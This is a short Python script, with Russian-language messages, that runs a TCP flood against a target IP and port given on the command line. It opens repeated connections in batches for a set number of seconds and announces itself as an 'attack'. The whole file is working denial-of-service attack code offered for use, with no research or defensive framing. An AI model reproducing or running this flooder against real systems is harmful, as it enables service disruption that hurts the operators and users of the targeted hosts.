import socket
import asyncio
import sys
from concurrent.futures import ThreadPoolExecutor

async def send_packet(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
        sock.sendto(b'Пакет данных', (ip, port))
    except Exception as e:
        print(f"Ошибка при отправке пакета: {str(e)}")
    finally:
        sock.close()

async def tcp_flood(ip, port, seconds, connections):
    end_time = asyncio.get_event_loop().time() + seconds
    print(f"Запуск TCP атаки на {ip}:{port} на {seconds} секунд(ы)...")

    tasks = []
    while asyncio.get_event_loop().time() < end_time:
        for _ in range(connections):
            tasks.append(send_packet(ip, port))
        await asyncio.gather(*tasks)
        tasks.clear()

    print("TCP атака завершена.")

async def main(ip, port, seconds, connections):
    await tcp_flood(ip, port, seconds, connections)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Использование: python3 tcp.py <ip> <port> <seconds> <connections>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    seconds = int(sys.argv[3])
    connections = int(sys.argv[4])

    asyncio.run(main(ip, port, seconds, connections))